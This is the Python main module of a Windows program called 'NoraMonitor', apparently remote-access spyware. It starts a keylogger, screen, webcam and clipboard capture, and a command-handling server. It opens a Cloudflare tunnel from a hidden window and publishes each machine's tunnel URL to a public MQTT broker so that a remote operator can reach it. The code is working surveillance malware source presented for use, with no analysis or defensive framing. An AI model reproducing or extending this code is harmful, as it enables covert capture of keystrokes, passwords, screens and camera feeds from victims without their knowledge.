import os
import re
import socket
import subprocess
import threading
import traceback

MQTT_BROKER  = "broker.hivemq.com"
MQTT_TOPIC   = "nora/7638d08dcd8340ef953c"

import server
import keylogger as kl
import screencap as sc
import controller
import recorder as rec
import camera as cam
import clipboard_monitor as cb

PORT = int(os.environ.get("NORA_PORT", 9090))

_APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
_RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")


def _log(msg):
    try:
        with open(os.path.join(_APP_DIR, "nora.log"), "a") as f:
            import datetime
            f.write(f"{datetime.datetime.now()} {msg}\n")
            f.flush()
    except Exception:
        pass


def _publish_url(pc_name, tunnel_url):
    try:
        import paho.mqtt.client as mqtt
        client = mqtt.Client()
        client.connect(MQTT_BROKER, 1883, 60)
        topic = f"{MQTT_TOPIC}/{pc_name.replace(' ', '_')}"
        client.publish(topic, tunnel_url, qos=1, retain=True)
        client.disconnect()
        _log(f"Published: {tunnel_url}")
    except Exception as e:
        _log(f"MQTT error: {e}")


def _start_tunnel(port):
    def _run():
        try:
            cloudflared = os.path.join(_APP_DIR, "cloudflared.exe")
            cmd = [cloudflared, "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate"]
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                startupinfo=si
            )
            published = False
            for line in proc.stdout:
                _log(f"CF: {line.rstrip()}")
                if not published:
                    m = re.search(r'https://[a-z0-9-]+\.trycloudflare\.com', line)
                    if m:
                        tunnel_url = m.group(0)
                        published = True
                        import time; time.sleep(2)
                        server.broadcast_ngrok_url(tunnel_url)
                        pc_name = socket.gethostname()
                        threading.Thread(
                            target=_publish_url, args=(pc_name, tunnel_url), daemon=True
                        ).start()
            proc.wait()
        except Exception as e:
            _log(f"Tunnel error: {e}")
    threading.Thread(target=_run, daemon=True).start()


def main():
    os.makedirs(_APP_DIR, exist_ok=True)
    os.makedirs(_RECORDINGS_DIR, exist_ok=True)
    _log("Nora starting")

    try:
        _log("Init recorder")
        recorder = rec.Recorder(output_dir=_RECORDINGS_DIR, fps=10)
        _log("Init camera")
        camera   = cam.CameraCapture(on_frame=server.broadcast_camera, fps=10, quality=55)
        _log("Init server")
        server.init(controller.handle_command, recorder, camera)
        _log("Init keylogger")
        kl.Keylogger(server.broadcast_key).start()
        _log("Init screencap")
        capture = sc.ScreenCapture(server.broadcast_frame, fps=12, quality=55, scale=0.6)
        capture.attach_recorder(recorder)
        capture.start()
        _log("Init clipboard")
        cb.ClipboardMonitor(server.broadcast_clipboard).start()
        _log("Starting tunnel")
        threading.Thread(target=_start_tunnel, args=(PORT,), daemon=True).start()
        _log("Starting server")
        server.run(port=PORT)
    except Exception:
        _log("CRASH:\n" + traceback.format_exc())


if __name__ == "__main__":
    main()
